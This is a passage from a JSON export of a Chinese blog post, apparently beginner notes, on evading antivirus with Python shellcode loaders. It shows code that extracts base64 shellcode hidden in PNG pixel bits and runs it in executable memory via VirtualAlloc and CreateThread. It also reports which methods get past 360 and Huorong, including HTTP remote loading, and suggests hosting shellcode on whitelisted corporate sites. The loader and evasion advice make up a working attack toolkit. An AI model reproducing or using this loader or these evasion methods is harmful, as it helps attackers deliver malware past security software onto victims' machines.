8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    #arguments &#x3D; docopt(__doc__)\n    im &#x3D; Image.open(&#39;encodedImage.png&#39;)\n    print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n    func&#x3D;base64.b64decode(RGBAdecodeImage(im))\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(func), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(func), len(func))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</code></pre>\n\n<p>加密完成会自动生成加密图片文件，解密加载脚本运行会自动获取文件夹内的加密图片文件，直接运行解密脚本上线</p>\n<p>坑点：上面的文本提取有一个坑点，就是需要使用exec执行函数，这样360是过不了的</p>\n<p>其中使用http远程加载，火绒是完全不会报毒，正常上线</p>\n<p>使用py2exe打包socket之后，运行程序360不会报毒，但是客户端发送加密shellcode就会直接被杀</p>\n<p>其他则是直接被杀，360果然还是挺强的</p>\n<h3 id=\"其他思路\"><a href=\"#其他思路\" class=\"headerlink\" title=\"其他思路\"></a>其他思路</h3><p>就是用不同方式请求获取shellcode</p>\n<p>如：获取app数据，获取oss页面数据，获取cdn数据，还有就是利用白名单，将shellcode放到一些可能是白名单的网站上像阿里云，百度等等的大公司的业务上面，只要能获取就行。</p>\n<p><strong>入门学习笔记，想通过审核进论坛看文章，别喷我！！！</strong></p>\n","text":" python免杀 小迪安全加载shellcode方式首先是shellcode两种常见的利用python的加载方式 import ctypes shellcode &#x3D; b&#39;&#39; rwxpage &#x3D; ctypes.windll.kernel32.V...","link":"","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"python","slug":"python","count":2,"path":"api/categories/python.json"}],"tags":[{"name":"免杀","slug":"免杀","count":2,"path":"api/tags/免杀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#python%E5%85%8D%E6%9D%80-%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8\"><span class=\"toc-text\">python免杀   小迪安全</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">加载shellcode方式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E6%B7%B7%E6%B7%86\"><span class=\"toc-text\">编码混淆</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#base64\"><span class=\"toc-text\">base64</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#aes\"><span class=\"toc-text\">aes</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%93%E5%8C%85%E5%99%A8\"><span class=\"toc-text\">打包器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pyinstaller\"><span class=\"toc-text\">pyinstaller</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#py2exe\"><span class=\"toc-text\">py2exe</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Nuitka\"><span class=\"toc-text\">Nuitka</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96shellcode\"><span class=\"toc-text\">文件提取shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#readfile\"><span class=\"toc-text\">readfile</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#argv%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">argv参数获取</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#http%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD\"><span class=\"toc-text\">http远程加载</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#socket%E7%AE%A1%E9%81%93%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">socket管道传输</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9A%90%E5%86%99%E5%85%A5PNG%E5%9B%BE%E7%89%87\"><span class=\"toc-text\">隐写入PNG图片</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">其他思路</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"免杀入门-小迪笔记","uid":"170904693726acf3c72f07df195a2a4e","slug":"免杀入门-小迪笔记","date":"2022-09-05T11:23:50.000Z","updated":"2022-09-05T11:32:27.989Z","comments":true,"path":"api/articles/免杀入门-小迪笔记.json","keywords":null,"cover":null,"text":"杀软检测方式在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到 免杀常见初始思路加载方式修改各种shellcode加载方式达到免杀效果 如常见加载器项目：Callback_Shellcode_Injection https://g...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"python","slug":"python","count":2,"path":"api/categories/python.json"}],"tags":[{"name":"免杀","slug":"免杀","count":2,"path":"api/tags/免杀.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入2","uid":"96816457e24e5ee2d74dc29d18ce444d","slug":"SQL注入2","date":"2022-07-15T12:05:32.000Z","updated":"2022-07-15T14:18:08.765Z","comments":true,"path":"api/articles/SQL注入2.json","keywords":null,"cover":null,"text":" 补补基础，理解注入，记下学习笔记 SQL注入数字型无需闭合单引号 字符型闭合语句进行注入 注入测试流程判断注入点注入类型获取信息函数user() database() version() @@hostname @@datadir @@version_compile_os sch...","link":"","photos":[],"count_time":{"symbolsCount":"3.1k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":7,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"owasp TOP 10","slug":"owasp-TOP-10","count":3,"path":"api/tags/owasp-TOP-10.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}